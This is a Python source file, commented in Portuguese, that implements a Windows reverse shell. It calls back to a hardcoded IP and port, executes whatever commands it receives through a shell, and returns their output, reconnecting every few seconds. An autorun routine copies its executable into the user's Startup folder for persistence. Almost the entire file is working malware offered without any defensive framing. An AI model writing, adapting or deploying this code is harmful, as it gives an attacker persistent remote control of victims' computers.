#### IMPORTS UTILIZADOS ####

import socket
import time
import subprocess
import threading
import os

### TESTE REALIZADO USANDO O NC NO KALI LINUX

IP = '192.168.0.1' ### IP QUE RECEBERA A SHELL
PORT = '443' ### PORTA QUE SERA UTILIZADA

### SOCKETS DE CONEXÃO

def autorun():
    filename = os.path.basename(__file__)
    exe_filename = filename.replace('.py','.exe')
    os.system('copy {} \'%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\''.format(exe_filename))

def connect(IP, PORT):
    try: 
        cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cliente.connect((IP, PORT))
        return cliente
    except Exception as error:
        print('Error connect', error)

### IMPUT PARA COMANDOS
### stdin=subprocess.PIPE → Permite enviar dados para o comando
### stdout=subprocess.PIPE → Captura a saída padrão do comando.
### stderr=subprocess.PIPE → Captura mensagens de erro.

def cmd(client, data):
    try:
        proc =  subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read()
        client.send(output + b'\n')
    except Exception as error:
        print('Error CMD', error)

### FUNÇÃO PARA ESCUTAR

def listen(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == '/exit':
                return
            else:
                threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as error:
        print('Error listen', error)
        client.close()

### MAIN DO PROGRAMA

if __name__ == '__main__':
    while True:
        client = connect(IP, PORT)
        if  client:
            listen(client)
        else:
            print('Conexao deu erro, tentando novamente')
            time.sleep(3)
